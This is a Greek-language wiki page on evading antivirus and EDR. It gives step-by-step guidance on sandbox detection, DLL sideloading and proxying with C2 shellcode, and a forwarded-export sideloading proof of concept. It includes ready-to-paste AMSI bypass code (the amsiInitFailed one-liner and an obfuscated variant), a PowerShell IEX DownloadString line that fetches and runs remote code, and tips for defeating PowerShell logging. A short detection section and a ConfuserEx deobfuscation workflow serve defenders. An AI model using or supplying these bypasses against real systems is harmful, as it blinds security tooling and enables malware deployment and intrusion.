# Παρακάμψη Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Απενεργοποίηση του Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί.
- [no-defender](https://github.com/es3n1n/no-defender): Ένα εργαλείο για να σταματήσει το Windows Defender από το να λειτουργεί προσποιούμενο ένα άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **Μεθοδολογία Παράκαμψης AV**

Προς το παρόν, τα AVs χρησιμοποιούν διαφορετικές μεθόδους για να ελέγξουν αν ένα αρχείο είναι κακόβουλο ή όχι: static detection, dynamic analysis, και για τα πιο προηγμένα EDRs, behavioural analysis.

### **Στατική ανίχνευση**

Η στατική ανίχνευση επιτυγχάνεται σηματοδοτώντας γνωστές κακόβουλες συμβολοσειρές ή πίνακες bytes σε ένα binary ή script, και επίσης εξάγοντας πληροφορίες από το ίδιο το αρχείο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σε πιάσει πιο εύκολα, καθώς πιθανώς έχουν ήδη αναλυθεί και σηματοδοτηθεί ως κακόβουλα. Υπάρχουν μερικοί τρόποι για να αποφύγεις αυτό το είδος ανίχνευσης:

- **Encryption**

Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμα σου, αλλά θα χρειαστείς κάποιον loader για να το αποκρυπτογραφήσει και να τρέξει το πρόγραμμα στη μνήμη.

- **Obfuscation**

Μερικές φορές το μόνο που χρειάζεται να κάνεις είναι να αλλάξεις μερικές συμβολοσειρές στο binary ή στο script σου για να περάσει από το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να αόρατοποιήσεις.

- **Custom tooling**

Αν αναπτύξεις τα δικά σου εργαλεία, δεν θα υπάρχουν γνωστές κακές υπογραφές, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> Ένας καλός τρόπος για να ελέγξεις απέναντι στην static detection του Windows Defender είναι το [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Βασικά χωρίζει το αρχείο σε πολλαπλά segments και στη συνέχεια ζητά από τον Defender να σαρώσει το κάθε ένα ξεχωριστά, με αυτόν τον τρόπο μπορεί να σου πει ακριβώς ποιες είναι οι σηματοδοτημένες συμβολοσειρές ή bytes στο binary σου.

Συνιστώ ιδιαίτερα να ελέγξετε αυτή τη [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) για πρακτική AV Evasion.

### **Δυναμική ανάλυση**

Η dynamic analysis είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρακολουθεί για κακόβουλη δραστηριότητα (π.χ. προσπάθεια αποκρυπτογράφησης και ανάγνωσης των passwords του browser, εκτέλεση minidump στο LSASS, κ.λπ.). Αυτό το μέρος μπορεί να είναι λίγο πιο περίπλοκο για να δουλέψεις, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις τα sandboxes.

- **Sleep before execution** Ανάλογα με το πώς είναι υλοποιημένο, μπορεί να είναι ένας εξαιρετικός τρόπος παράκαμψης της dynamic analysis των AV. Τα AV έχουν πολύ μικρό χρόνο για να σαρώσουν αρχεία ώστε να μην διαταράξουν τη ροή εργασίας του χρήστη, οπότε η χρήση μεγάλων sleeps μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλά να παραλείψουν το sleep ανάλογα με το πώς είναι υλοποιημένο.
- **Checking machine's resources** Συνήθως τα Sandboxes έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), αλλιώς θα μπορούσαν να επιβραδύνουν τον υπολογιστή του χρήστη. Εδώ μπορείς να γίνεις πολύ δημιουργικός, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμα και τις στροφές του ανεμιστήρα — δεν θα είναι όλα υλοποιημένα στο sandbox.
- **Machine-specific checks** Αν θέλεις να στοχεύσεις έναν χρήστη του οποίου ο workstation είναι ενταγμένος στο domain "contoso.local", μπορείς να ελέγξεις το domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που έχεις καθορίσει — αν δεν ταιριάζει, μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.

Αποδεικνύεται ότι το Microsoft Defender's Sandbox έχει όνομα υπολογιστή HAL9TH, οπότε μπορείς να ελέγξεις το όνομα του υπολογιστή στο malware σου πριν την εκτέλεση — αν το όνομα ταιριάζει με HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο sandbox του defender, οπότε μπορείς να κάνεις το πρόγραμμα σου να τερματίσει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμα πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για το πώς να αντιμετωπίσεις τα Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> κανάλι #malware-dev</p></figcaption></figure>

Όπως είπαμε πριν, **δημόσια εργαλεία** τελικά **θα εντοπίζονται**, οπότε πρέπει να αναρωτηθείς κάτι:

Για παράδειγμα, αν θέλεις να κάνεις dump το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσεις το mimikatz**; Ή θα μπορούσες να χρησιμοποιήσεις ένα διαφορετικό project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS.

Η σωστή απάντηση είναι πιθανώς το δεύτερο. Παίρνοντας ως παράδειγμα το mimikatz, είναι πιθανώς ένα από τα πιο, αν όχι το πιο, σηματοδοτημένα κομμάτια malware από τα AVs και τα EDRs — ενώ το project αυτό είναι πολύ καλό, είναι επίσης εφιάλτης να δουλεύεις με αυτό για να αποφύγεις τα AVs, οπότε απλώς ψάξε για εναλλακτικές για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> Όταν τροποποιείς τα payloads σου για evasion, βεβαιώσου ότι **απενεργοποιείς την αυτόματη αποστολή δειγμάτων** στον defender, και σε παρακαλώ, σοβαρά, **DO NOT UPLOAD TO VIRUSTOTAL** αν ο στόχος σου είναι μακροπρόθεσμη evasion. Αν θέλεις να ελέγξεις αν το payload σου εντοπίζεται από ένα συγκεκριμένο AV, εγκατάστησέ το σε ένα VM, προσπάθησε να απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων, και δοκίμασέ το εκεί μέχρι να μείνεις ικανοποιημένος με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτεραιοποίησε τη χρήση DLLs για evasion** — από την εμπειρία μου, τα DLL αρχεία είναι συνήθως **πολύ λιγότερο ανιχνευμένα** και αναλυμένα, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις την ανίχνευση σε κάποιες περιπτώσεις (αν το payload σου έχει κάποιον τρόπο να τρέξει ως DLL φυσικά).

Όπως φαίνεται σε αυτήν την εικόνα, ένα DLL Payload από Havoc έχει rate ανίχνευσης 4/26 στο antiscan.me, ενώ το EXE payload έχει rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me σύγκριση ενός κανονικού Havoc EXE payload vs ενός κανονικού Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με αρχεία DLL για να γίνεις πολύ πιο stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται τη DLL search order που χρησιμοποιείται από τον loader τοποθετώντας τόσο την victim εφαρμογή όσο και τα κακόβουλα payload(s) το ένα δίπλα στο άλλο.

Μπορείς να ελέγξεις προγράμματα που είναι ευάλωτα σε DLL Sideloading χρησιμοποιώντας [Siofra](https://github.com/Cybereason/siofra) και το ακόλουθο powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων ευάλωτων σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συνιστώ έντονα να **εξερευνήσετε DLL Hijackable/Sideloadable programs μόνοι σας**, αυτή η τεχνική είναι αρκετά stealthy όταν γίνεται σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable programs, μπορεί να συλληφθείτε εύκολα.

Απλώς τοποθετώντας ένα κακόβουλο DLL με το όνομα που το πρόγραμμα αναμένει να φορτώσει, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα αναμένει συγκεκριμένες συναρτήσεις μέσα σε εκείνο το DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL στο αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) project από [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL, και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Αυτά είναι τα αποτελέσματα:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Και το shellcode μας (κωδικοποιημένο με [SGN](https://github.com/EgeBalci/sgn)) και το proxy DLL έχουν ποσοστό ανίχνευσης 0/26 στο [antiscan.me](https://antiscan.me)! Θα το χαρακτήριζα επιτυχία.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας **συνιστώ ανεπιφύλακτα** να παρακολουθήσετε [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα για όσα συζητήσαμε σε μεγαλύτερο βάθος.

### Κατάχρηση των Forwarded Exports (ForwardSideLoading)

Windows PE modules μπορούν να export functions που είναι στην πραγματικότητα "forwarders": αντί να δείχνουν σε κώδικα, η εγγραφή export περιέχει μια ASCII συμβολοσειρά της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει το export, ο Windows loader θα:

- Load `TargetDll` if not already loaded
- Resolve `TargetFunc` from it

Key behaviors to understand:
- If `TargetDll` is a KnownDLL, it is supplied from the protected KnownDLLs namespace (e.g., ntdll, kernelbase, ole32).
- If `TargetDll` is not a KnownDLL, the normal DLL search order is used, which includes the directory of the module that is doing the forward resolution.

Αυτό επιτρέπει ένα έμμεσο sideloading primitive: βρείτε ένα signed DLL που exports μια function forwarded σε ένα non-KnownDLL module name, στη συνέχεια co-locate εκείνο το signed DLL με ένα attacker-controlled DLL με ακριβώς το ίδιο όνομα όπως το forwarded target module. Όταν το forwarded export καλείται, ο loader επιλύει το forward και φορτώνει το DLL σας από τον ίδιο κατάλογο, εκτελώντας το DllMain σας.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο system DLL σε έναν φάκελο με δικαιώματα εγγραφής
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Αποθέστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο `DllMain` είναι αρκετό για να αποκτήσετε εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε την προωθούμενη συνάρτηση για να ενεργοποιηθεί το `DllMain`.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Πυροδοτήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Κατά την επίλυση του `KeyIsoSetAuditingInterface`, ο φορτωτής ακολουθεί την προώθηση στο `NCRYPTPROV.SetAuditingInterface`
- Ο φορτωτής στη συνέχεια φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν υλοποιείται, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη εκτελεστεί

Hunting tips:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. KnownDLLs are listed under `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε τα forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε το Windows 11 forwarder inventory για να αναζητήσετε υποψηφίους: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Παρακολουθήστε τα LOLBins (π.χ., rundll32.exe) να φορτώνουν υπογεγραμμένα DLLs από μη-συστημικά μονοπάτια, ακολουθούμενα από φόρτωση μη-KnownDLLs με το ίδιο base name από εκείνον τον κατάλογο
- Ειδοποιήστε για αλυσίδες διεργασιών/μονάδων όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` σε μονοπάτια εγγράψιμα από τον χρήστη
- Εφαρμόστε πολιτικές ακεραιότητας κώδικα (WDAC/AppLocker) και απαγορεύστε την εγγραφή+εκτέλεση στους καταλόγους εφαρμογών

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Η αποφυγή ανίχνευσης είναι απλώς ένα παιχνίδι γάτας και ποντικιού — αυτό που λειτουργεί σήμερα μπορεί να ανιχνευτεί αύριο, οπότε ποτέ μην βασίζεστε σε ένα μόνο εργαλείο· αν είναι δυνατόν, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές evasion.

## AMSI (Anti-Malware Scan Interface)

AMSI δημιουργήθηκε για να αποτρέψει το "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AV μπορούσαν να σαρώσουν μόνο **αρχεία στον δίσκο**, οπότε αν καταφέρνατε με κάποιο τρόπο να εκτελέσετε payloads **directly in-memory**, το AV δεν μπορούσε να κάνει τίποτα για να το σταματήσει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη σε αυτά τα components των Windows.

- User Account Control, ή UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να επιθεωρούν τη συμπεριφορά των scripts εκθέτοντας τα περιεχόμενα των scripts σε μορφή που είναι τόσο μη κρυπτογραφημένη όσο και μη obfuscated.

Η εκτέλεση της εντολής `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα προκαλέσει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Προσέξτε πώς προθέτει `amsi:` και στη συνέχεια το path προς το εκτελέσιμο από το οποίο τρέχει το script, σε αυτή την περίπτωση, powershell.exe

Δεν αφήσαμε κανένα αρχείο στον δίσκο, αλλά παρ’ όλα αυτά πιάσαμε in-memory λόγω του AMSI.

Επιπλέον, ξεκινώντας από **.NET 4.8**, ο C# κώδικας περνάει επίσης από AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για in-memory execution. Γι’ αυτό προτείνεται η χρήση χαμηλότερων εκδόσεων του .NET (όπως 4.7.2 ή χαμηλότερα) για in-memory execution αν θέλετε να αποφύγετε το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακάμψετε το AMSI:

- **Obfuscation**

Εφόσον το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείτε να φορτώσετε μπορεί να είναι ένας καλός τρόπος για να αποφύγετε την ανίχνευση.

Ωστόσο, το AMSI έχει τη δυνατότητα να απεμπλέκει (unobfuscate) scripts ακόμα και αν έχουν πολλαπλά επίπεδα obfuscation, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που γίνεται. Αυτό το κάνει όχι τόσο απλό να παρακαμφθεί. Αν και, μερικές φορές, το μόνο που χρειάζεται είναι να αλλάξετε μερικά ονόματα μεταβλητών και θα είστε εντάξει — εξαρτάται από το πόσο έχει σημαδευτεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται φορτώνοντας ένα DLL στη διαδικασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι δυνατόν να το παραποιήσει κάποιος αρκετά εύκολα ακόμα και τρέχοντας ως μη προνομιακός χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους να αποφύγουν το AMSI scanning.

**Forcing an Error**

Αναγκάζοντας την αρχικοποίηση του AMSI να αποτύχει (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει καμία σάρωση για τη τρέχουσα διαδικασία. Αρχικά αυτό αποκαλύφθηκε από τον [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft ανέπτυξε ένα signature για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα powershell για να καταστήσει το AMSI μη λειτουργικό για την τρέχουσα διαδικασία powershell. Αυτή η γραμμή, φυσικά, έχει εντοπιστεί από το ίδιο το AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Λάβετε υπόψη ότι αυτό πιθανότατα θα επισημανθεί μόλις δημοσιευτεί αυτή η ανάρτηση, οπότε μην δημοσιεύετε κώδικα αν σκοπεύετε να παραμείνετε αόρατοι.

**Memory Patching**

Η τεχνική αυτή ανακαλύφθηκε αρχικά από [@RastaMouse](https://twitter.com/_RastaMouse/) και περιλαμβάνει την εύρεση της διεύθυνσης της συνάρτησης "AmsiScanBuffer" στο amsi.dll (υπεύθυνη για τη σάρωση της εισόδου που παρέχει ο χρήστης) και την αντικατάστασή της με εντολές που επιστρέφουν τον κωδικό E_INVALIDARG. Με αυτόν τον τρόπο, το αποτέλεσμα της πραγματικής σάρωσης θα επιστρέφει 0, το οποίο ερμηνεύεται ως καθαρό αποτέλεσμα.

> [!TIP]
> Παρακαλώ διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

Υπάρχουν επίσης πολλές άλλες τεχνικές για να παρακάμψετε το AMSI με powershell — ελέγξτε [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) και [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) για να μάθετε περισσότερα.

Αυτό το εργαλείο [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) επίσης δημιουργεί script για να παρακάμψει το AMSI.

**Αφαιρέστε την ανιχνευθείσα υπογραφή**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευθείσα υπογραφή AMSI από τη μνήμη της τρέχουσας διεργασίας. Το εργαλείο αυτό λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την υπογραφή AMSI και στη συνέχεια την αντικαθιστά με εντολές NOP, αφαιρώντας την ουσιαστικά από τη μνήμη.

**AV/EDR προϊόντα που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε λίστα προϊόντων AV/EDR που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποιήστε PowerShell έκδοση 2**
Αν χρησιμοποιήσετε PowerShell έκδοση 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα scripts σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## PS Καταγραφή

PowerShell logging είναι μια λειτουργία που σας επιτρέπει να καταγράφετε όλες τις εντολές PowerShell που εκτελούνται σε ένα σύστημα. Αυτό μπορεί να είναι χρήσιμο για σκοπούς ελέγχου και αντιμετώπισης προβλημάτων, αλλά μπορεί επίσης να αποτελέσει ένα **πρόβλημα για επιτιθέμενους που θέλουν να αποφύγουν τον εντοπισμό**.

Για να παρακάμψετε την καταγραφή του PowerShell, μπορείτε να χρησιμοποιήσετε τις ακόλουθες τεχνικές:

- **Disable PowerShell Transcription and Module Logging**: Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) γι' αυτόν τον σκοπό.
- **Use Powershell version 2**: Εάν χρησιμοποιήσετε PowerShell έκδοσης 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να εκτελέσετε τα σενάρια σας χωρίς να σαρωθούν από το AMSI. Μπορείτε να το κάνετε έτσι: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Χρησιμοποιήστε [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) για να εκκινήσετε ένα powershell χωρίς προστασίες (αυτό είναι που χρησιμοποιεί το `powerpick` από Cobal Strike).


## Απόκρυψη

> [!TIP]
> Πολλές τεχνικές απόκρυψης βασίζονται στην κρυπτογράφηση δεδομένων, πράγμα που θα αυξήσει την εντροπία του δυαδικού αρχείου και θα καταστήσει ευκολότερη την ανίχνευσή του από AVs και EDRs. Προσοχή σε αυτό και ίσως εφαρμόστε κρυπτογράφηση μόνο σε συγκεκριμένα τμήματα του κώδικά σας που είναι ευαίσθητα ή χρειάζεται να κρυφτούν.

### Αποαπόκρυψη .NET δυαδικών προστατευμένων από ConfuserEx

Κατά την ανάλυση malware που χρησιμοποιεί ConfuserEx 2 (ή εμπορικά forks) είναι συνηθισμένο να αντιμετωπίζετε πολλαπλά επίπεδα προστασίας που θα μπλοκάρουν decompilers και sandboxes. Η παρακάτω ροή εργασίας αποκαθιστά αξιόπιστα ένα σχεδόν αυθεντικό IL που στη συνέχεια μπορεί να αποσυμπιλοποιηθεί σε C# με εργαλεία όπως dnSpy ή ILSpy.

1.  Anti-tampering removal – ConfuserEx κρυπτογραφεί κάθε *method body* και το αποκρυπτογραφεί μέσα στον static constructor του *module* (`<Module>.cctor`). Αυτό επίσης τροποποιεί το PE checksum, οπότε οποιαδήποτε τροποποίηση θα προκαλέσει σφάλμα στο δυαδικό. Χρησιμοποιήστε **AntiTamperKiller** για να εντοπίσετε τους κρυπτογραφημένους πίνακες μεταδεδομένων, να ανακτήσετε τα XOR keys και να επαναγράψετε ένα καθαρό assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Η έξοδος περιέχει τις 6 παραμέτρους anti-tamper (`key0-key3`, `nameHash`, `internKey`) που μπορεί να είναι χρήσιμες κατά την κατασκευή του δικού σας unpacker.

2.  Symbol / control-flow recovery – δώστε το *clean* αρχείο στο **de4dot-cex** (ένα ConfuserEx-aware fork του de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – επιλέξτε το ConfuserEx 2 profile  
• το de4dot θα αναιρέσει το control-flow flattening, θα αποκαταστήσει τα αρχικά namespaces, classes και ονόματα μεταβλητών και θα αποκρυπτογραφήσει τις σταθερές συμβολοσειρές.

3.  Proxy-call stripping – ConfuserEx αντικαθιστά τις άμεσες κλήσεις μεθόδων με ελαφριά wrappers (a.k.a *proxy calls*) για να δυσχεράνει περαιτέρω την αποσυμπίπτονση. Αφαιρέστε τα με **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Μετά από αυτό το βήμα θα πρέπει να δείτε κανονικές .NET API όπως `Convert.FromBase64String` ή `AES.Create()` αντί για αδιαφανείς wrapper functions (`Class8.smethod_10`, …).

4.  Manual clean-up – εκτελέστε το προκύπτον δυαδικό υπό dnSpy, αναζητήστε μεγάλα Base64 blobs ή χρήση `RijndaelManaged`/`TripleDESCryptoServiceProvider` για να εντοπίσετε το *πραγματικό* payload. Συχνά το malware το αποθηκεύει ως TLV-encoded byte array αρχικοποιημένο μέσα σε `<Module>.byte_0`.

Η παραπάνω αλυσίδα αποκαθιστά τη ροή εκτέλεσης **χωρίς** να απαιτείται η εκτέλεση του κακόβουλου δείγματος – χρήσιμο όταν δουλεύετε σε offline workstation.

> 🛈 Το ConfuserEx παράγει ένα custom attribute με όνομα `ConfusedByAttribute` που μπορεί να χρησιμοποιηθεί ως IOC για αυτόματη ταξινόμηση δειγμάτων.

#### Μια γραμμή εντολής
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Σκοπός αυτού του project είναι να παρέχει ένα fork ανοιχτού κώδικα του [LLVM] compilation suite ικανό να προσφέρει αυξημένη ασφάλεια λογισμικού μέσω [code obfuscation] και tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstates how to use `C++11/14` language to generate, at compile time, obfuscated code without using any external tool and without modifying the compiler.
- [**obfy**](https://github.com/fritzone/obfy): Προσθέτει ένα επίπεδο από obfuscated operations που παράγονται από το C++ template metaprogramming framework, κάνοντας τη ζωή του ατόμου που θέλει να crack-άρει την εφαρμογή λίγο πιο δύσκολη.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz είναι ένας x64 binary obfuscator που μπορεί να obfuscate διάφορα πε αρχεία όπως: .exe, .dll, .sys
